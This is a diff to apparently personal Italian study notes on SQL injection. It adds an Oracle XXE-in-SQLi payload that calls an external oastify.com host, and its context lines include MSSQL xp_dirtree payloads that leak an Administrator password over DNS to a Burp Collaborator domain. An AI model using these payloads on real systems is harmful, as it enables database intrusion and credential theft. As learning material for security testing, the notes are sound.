@@ -136,6 +136,8 @@ con collaborator si monta un dns server e ricevere le risposte
 '; exec master..xp_dirtree '//0efdymgw1o5w9inae8mg4dfrgim9ay.burpcollaborator.net/a'--         -> per confermare che si possono fare richieste out of bound
 '; declare @p varchar(1024);set @p=(SELECT password FROM users WHERE username='Administrator');exec('master..xp_dirtree "//'+@p+'.cwcsgt05ikji0n1f2qlzn5118sek29.burpcollaborator.net/a"')--    -> per mandare dati out of bound
 
+TrackingId=x'+UNION+SELECT+EXTRACTVALUE(xmltype('<%3fxml+version%3d"1.0"+encoding%3d"UTF-8"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"http%3a//503fd2tfdq9rjr3wcs7hw0ryspygm7aw.oastify.com/">+%25remote%3b]>'),'/l')+FROM+dual--  ->oast request for out of bound requests
+
 SECOND ORDER SQL INJECTION
 
 input viene salvato nel database e magari viene richiamato in altre funzioni ma non immediatamente, esempio stored xss
